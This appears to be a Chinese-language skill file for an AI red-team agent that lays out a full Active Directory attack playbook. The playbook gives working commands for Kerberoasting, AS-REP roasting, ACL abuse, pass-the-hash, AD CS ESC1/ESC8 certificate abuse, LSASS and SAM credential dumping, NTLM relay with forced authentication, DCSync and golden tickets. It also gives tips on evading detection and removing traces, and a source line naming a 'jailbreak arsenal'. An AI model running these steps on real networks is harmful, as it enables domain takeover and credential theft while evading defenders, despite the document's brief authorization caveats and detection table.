---
name: windows-ad
description: 域内渗透与 Windows 身份攻击：Kerberos 委派（非约束/约束/RBCD）、AD CS 证书滥用、BloodHound 攻击路径、ACL 滥用、DPAPI 凭据解密、LSASS 内存物料、NTLM 中继与强制认证、域内横向移动、域管提权。适用于只拿到一个普通域账号、问内网怎么打、域委派怎么利用、或者要从域用户提到 Domain Admin 时。
whenToUse: 有域环境、域账号（哪怕普通用户）、要查委派/证书模板/ACL 路径、要做 Kerberos 票据攻击、要解 DPAPI 或 LSASS 里的凭据、要从域内一台机器横向到域控时加载
source: dsh-jailbreak-arsenal@1.7.0 bundled_skills（已按本仓格式改写，非照抄）
---

# Windows / Active Directory Security

## 适用场景

- 域渗透、Kerberoasting、AS-REP、委派
- AD CS（ESC1–ESC8 等）证书攻击
- BloodHound / SharpHound 攻击路径
- NTLM Relay / Coercer 强制认证
- 本地提权到域路径（Potato 等作为跳板）

## 与 attack-chain 关系

- **多阶段从外网到域控** → PRIMARY 可仍是 `attack-chain/`，本 skill 为 **AD 专科**
- **已在域内专注身份** → PRIMARY = 本 skill

## 工作流

### 0. 先定坐标：你在域里的哪一层

不要一进来就打。先判断手里有什么，决定走哪条路——**这一步决定后面 80% 的动作**：

| 手里的东西 | 能做什么 | 入口技能 |
|---|---|---|
| 只有一个 IP / 域名字符串 | 只能匿名枚举：找 DC、找域功能级别、找 SMB 签名 | 本节 1（无凭据枚举） |
| 一个普通域用户（低权） | Kerberoast / AS-REP / 枚举 ACL / AD CS 模板 | 本节 2、4 |
| 本地管理员（非域管） | LSASS dump / 本地 SAM / 找本地缓存域凭据 | 本节 5 |
| 一个 NTLM 哈希（无明文） | PtH / Overpass-the-Hash / 中继 | 本节 3、6 |
| 一个机器账号 / 已控主机 | 强制认证（coerce）+ 中继 → 打 DC | 本节 6 |
| 已有域管 | 收尾：DCSync / 黄金票 / 持久化 | 本节 7（**高危，须授权**） |

**判据**：拿不到「域用户」，就别看 2/4/5，先解决「怎么拿到一个域用户」——通常从已控主机的 LSASS 或缓存凭据里出。

### 1. 无凭据也能做的枚举（先做，成本最低）

```bash
# 找 DC：DNS 的 SRV 记录是最直接的
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
# 或直接问域名的 NS
dig +short <domain> NS

# null session 能不能读（老域常见）
nxc smb <DC_IP> -u '' -p '' --shares
rpcclient -U '' -N <DC_IP> -c 'querydominfo; enumdomusers'

# SMB 签名状态：关着 = 可中继，这是后面第 6 节的先决条件
nxc smb <range> --gen-relay-list relay_targets.txt

# 域功能级别 / 密码策略（决定爆破可行性）
nxc smb <DC_IP> -u '' -p '' --pass-pol
```

**关键判断**：`--gen-relay-list` 输出非空 + 能强制认证 = **中继路线成立**，这往往比爆破快得多。

### 2. 低权域用户能撬的三个口子

**① Kerberoast（有 SPN 的服务账号）**

```bash
# 只取 RC4 的（更容易破），并排除 krbtgt
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request -outputfile kerb.hash
# 过滤：$ 结尾是机器账号，先跳过
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request | grep -v '\$'
hashcat -m 13100 kerb.hash rockyou.txt        # RC4
hashcat -m 19700 kerb.hash rockyou.txt        # AES（慢得多，字典要小）
```

**② AS-REP Roasting（不需要预认证的账号）**

```bash
impacket-GetNPUsers <domain>/ -dc-ip <DC> -usersfile users.txt -format hashcat -outputfile asrep.hash
# 无凭据也能打（只要知道用户名）
hashcat -m 18200 asrep.hash rockyou.txt
```

**③ ACL 滥用（BloodHound 图上找）**

```bash
# 采集（有凭据才能采全）
bloodhound-python -d <domain> -u <user> -p <pass> -ns <DC> -c All --zip
# 无凭据/受限环境改用 LDAP 直查
ldapsearch -x -H ldap://<DC> -D '<user>@<domain>' -w '<pass>' -b 'DC=<d>,DC=<local>' \
  '(objectClass=user)' sAMAccountName servicePrincipalName
```

BloodHound 里优先看这几条边——**它们一条就够到域管**：

| 边 | 含义 | 利用方式 |
|---|---|---|
| `GenericAll` / `GenericWrite` | 对目标对象有全权/写权 | 直接改密码 或 写 SPN 再 Kerberoast |
| `WriteDacl` | 能改 ACL | 给自己加 `DCSync` 权限 |
| `ForceChangePassword` | 能强制改密码 | 改完直接登录 |
| `AddMember` | 能加组 | 把自己加进 Domain Admins |
| `WriteOwner` | 能改所有者 | 改成自己再 WriteDacl |

```bash
# GenericAll 改密码（最常见的 ACL 落地）
net rpc password <target_user> -U '<domain>/<user>%<pass>' -S <DC>
# 或 impacket
impacket-smbpasswd <domain>/<user>:<pass>@<DC> -newpass 'P@ssw0rd123' -target <target_user>
```

### 3. 票据与哈希：无明文也能走

```bash
# PtH（有 NTLM 哈希，不需要明文）
nxc smb <target> -u <user> -H <nthash> --shares
impacket-psexec -hashes :<nthash> <domain>/<user>@<target>

# Overpass-the-Hash（要拿 Kerberos 票据时）
impacket-getTGT <domain>/<user> -hashes :<nthash> -dc-ip <DC>
export KRB5CCNAME=<user>.ccache

# PtT（已有 .kirbi / .ccache）
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass <domain>/<user>@<target>

# 票据导出与离线分析
impacket-ticketConverter ticket.kirbi ticket.ccache
```

**常见卡点**：`KRB5CCNAME` 设了但 `klist` 空 → 票据过期（默认 10 小时）或时钟偏移 >5 分钟，先 `ntpdate <DC>`。

### 4. AD CS：一条模板配错就等于域管

这是近年最高性价比的路径。**先跑扫描，别猜**：

```bash
# 一次性把所有 ESC 都扫一遍
certipy find -u <user>@<domain> -p <pass> -dc-ip <DC> -vulnerable -stdout
```

| ESC | 条件 | 利用 |
|---|---|---|
| **ESC1** | 模板允许「申请人提供 SAN」+ 低权限可注册 | 申请一张 `administrator` 的证书 |
| **ESC2** | 模板允许「任意用途」 | 当 ESC1 用 |
| **ESC3** | 注册代理模板 | 代理他人申请 |
| **ESC4** | 对模板有写权限 | 改成 ESC1 再打 |
| **ESC6** | CA 开了 `EDITF_ATTRIBUTESUBJECTALTNAME2` | 任意模板都能塞 SAN |
| **ESC7** | CA 上 ManageCA/ManageCertificates | 给自己发管理权 |
| **ESC8** | HTTP 注册端点 + 可强制认证 | 中继到 `/certsrv/` 拿证书 |

```bash
# ESC1 落地
certipy req -u <user>@<domain> -p <pass> -ca <CA_NAME> -template <TEMPLATE> \
  -upn administrator@<domain> -dc-ip <DC>
certipy auth -pfx administrator.pfx -dc-ip <DC>     # 换出 NT 哈希
```

**判据**：`certipy find -vulnerable` 只要报出任意一条，AD CS 路线就优先于 Kerberoast——它通常一步到域管，不用破密码。

### 5. 已控主机上榨凭据（从本地管理员到域用户）

```bash
# LSASS 内存里的域凭据（需管理员 + 能绕过 EDR）
impacket-secretsdump -just-dc-user <user> <domain>/<admin>:<pass>@<host>
# 或本机
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 本地 SAM（只有本地账号，但常见重复使用）
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# 域缓存凭据（断网也能验的那 10 个，常是域管登录过的机器）
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL | grep -i cache
# 缓存哈希用 msCacheV2 格式破：hashcat -m 2100
```

**优先级**：`域缓存凭据` > `LSASS` > `本地 SAM`。缓存那 10 个账号往往包含域管——这是从「本地管理员」跳到「域用户」最短的路。

**别忘清理**：dump 完删掉落地文件；EDR 会记 `lsass` 访问事件，这一动作本身就是告警源（见下「检测视角」）。

### 6. 强制认证 + 中继（不需要破任何密码）

```bash
# 前提：SMB 签名关（第 1 节的 relay_targets.txt 非空）

# ① 先起中继器（指向 DC，准备打 LDAP 或 HTTP）
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -t ldaps://<DC> --add-computer
#    加机器账号后可用 RBCD 打 DC；也可 --escalate-user 直接提权

# ② 强制目标来认证（挑一个能通的）
coercer coerce -u <user> -p <pass> -d <DC> -t <victim_ip> --always-continue
#    或用 PetitPotam / PrinterBug
python3 PetitPotam.py -u <user> -p <pass> <listener_ip> <victim_ip>

# ③ 组合：ESC8 场景把中继指向证书服务，直接换证书
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -t http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
```

**这条路的优势**：不破密码、不落文件、只靠协议。**劣势**：依赖签名关闭 + 能强制认证，两个前提有一个不成立就废。

### 7. 收尾（域管之后，全部高危）

```bash
# DCSync：拉 krbtgt 哈希（等于永久域权限，务必先拿到书面授权）
impacket-secretsdump -just-dc <domain>/<da_user>:<pass>@<DC>

# 黄金票（krbtgt 哈希 + 域 SID）
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> administrator
export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass <domain>/administrator@<DC>
```

**红线**：DCSync / 黄金票 / 改域策略 这三样，**动手前必须确认授权书面覆盖**。演练场景里它们属「已达成目标」，通常只需证明可行性，不必真做。

## 检测视角（防守方在日志里看到什么）

> 这一节是本技能与纯攻击手册的区别：**知道对手怎么看见你，才知道哪一步该慢下来。**

| 动作 | 防守方看哪里 | 典型信号 |
|---|---|---|
| Kerberoast | DC 的 4769 事件 | 同一账号短时间内大量 `RC4` 加密的服务票据请求，且 `Service Name` 非 `krbtgt` |
| AS-REP | DC 的 4768 | `Pre-Authentication Type = 0`（未启用预认证）的批量请求 |
| ACL 滥用 | 4662（目录服务访问） | 对 `Domain Admins` 等敏感对象的 `WriteDacl`/`GenericAll` 写操作 |
| DCSync | 4662 + 4624 | 非 DC 的机器发起 `DS-Replication-Get-Changes-All`（复制权限 GUID） |
| PtH | 4624 Type 3 | 同一账号从异常主机登录，且 `Logon Process = NtLmSsp` |
| AD CS ESC1 | CA 的证书签发日志 | 申请者与证书 `SAN` 里的 UPN 不一致 |
| 强制认证 | 主机 4624/5156 | 目标机向非预期主机发起 SMB/LDAP 认证（尤其来自 DC 机器账号） |
| LSASS dump | 4656 / Sysmon 10 | 进程打开 `lsass.exe` 且 `GrantedAccess` 含 `0x1010`/`0x1410` |

**实用推论**：`Kerberoast` 和 `AS-REP` 噪声最大（DC 上成片的 4769/4768），**低慢小**可以靠「每 30 秒一个账号、混在业务时段」压低；`DCSync` 噪声最小但后果最重，属「一响就终局」。

## 工具链

| 工具 | 用途 | 本机是否有 |
|------|------|------|
| NetExec (`nxc`) | 枚举 / PtH / 中继前探测 | 需装 |
| Impacket 套件 | 票据 / dump / 中继 / 强制认证 | 随 Kali |
| Certipy | AD CS 全 ESC 扫描与利用 | 需装（`pipx install certipy-ad`） |
| BloodHound / SharpHound | ACL 路径图 | 需装（图更重要，采集可用 `bloodhound-python` 替代） |
| Rubeus / Mimikatz | 票据与内存凭据 | Windows 侧工具 |
| Coercer / PetitPotem | 强制认证 | `pipx install coercer` |

**降级路线**（本机缺工具时）：`bloodhound-python` 替代 SharpHound；`ldapsearch` + 手工 ACL 判读替代整张图；`impacket-ntlmrelayx` 已含强制认证客户端能力，`coercer` 不可用时先试它的 `--smb2support` 组合。

## 工具链

| 工具 | 用途 |
|------|------|
| BloodHound / SharpHound | 路径图 |
| Certipy | AD CS |
| Impacket / NetExec | 横向与枚举 |
| Rubeus / Mimikatz | 票据与凭证（授权） |
| Coercer / Responder | 强制认证 / 投毒 |

## 参考

- `references/ad-attack-paths.md`
- `references/network-attack-defense.md`（防守视角：日志留痕与噪声等级）
- `../attack-chain/`
- seeds: `落地记录/seed-005_ad-certipy-esc1.md` `seed-007_ntlm-relay-coercer.md` `seed-013_kerberoasting-spn.md`

## 路由上下文

**上游**: MASTER R24  
**下游**: 报告 `docs-generator`；需 EDR 研究 `edr-bypass-re`  
**MUST NOT**: 无授权 DCSync / 黄金票打生产

## 任务完成自检

- [ ] 是否先有图/枚举再有利用？
- [ ] 是否记录可复现命令并脱敏？
- [ ] 是否遵守 scope 禁止项？
- [ ] Checklist？

## 本机工具实况（导入时快照；当前真值用 `npm run toolkit:check` 或 `node scripts/sync-tool-status.mjs` 复核——表会过期，命令不会）

| 工具 | 状态 |
| --- | --- |
| `bloodhound` | ❌ 未装（用前先装，或改用等价工具） |
| `sharphound` | ❌ 未装（用前先装，或改用等价工具） |



<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

本技能命令用到的工具里，本机（PATH 与 toolkit 双探）没有：`hashcat`、`impacket`、`netexec`、`nxc`、`bloodhound`、`mimikatz`
- `hashcat`：官方只发 `hashcat-<ver>.7z`（多平台包，需 7z 解压后取 hashcat.exe）
- `impacket`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `netexec`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `nxc`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `bloodhound`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `mimikatz`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建

runnability:end -->

<!-- second-shot:start scripts/inject-second-shot.mjs 生成，勿手改 -->

## 第二发（主力打不出去时，按这个顺序换）

1. **同类替代**（链路里的互补技能，手法最接近）：`identity-federation`

2. **前提没满足就先回去**：`lateral-movement`、`netexec-scan` —— 上一环没做实，本环再试也是空打

3. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

4. **目标比预期更深**：换到同主题的专项靶子面 `competition-ad-certificate-abuse`、`competition-kerberos-delegation`、`competition-lsass-ticket-material`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：5 内网渗透｜**角色**：`internal`
- **上游**（先做完这些再进来）：`lateral-movement`、`netexec-scan`
- **下游**（产出交给谁）：`identity-federation`、`edr-bypass-re`、`competition-kerberos-delegation`
- **专项下游**（同主题更深的靶子面）：`competition-ad-certificate-abuse`、`competition-kerberos-delegation`、`competition-lsass-ticket-material`、`competition-windows-pivot`
- **互补**（同类场景一起用）：`identity-federation`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`credential`、`access` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_sessions`（一屏看已上线 WebShell、隧道可达网段、凭据、访问会话）；`redteam_sessions`（同上：判断现在能往哪走，别凭记忆）

<!-- /skill-link-graph -->
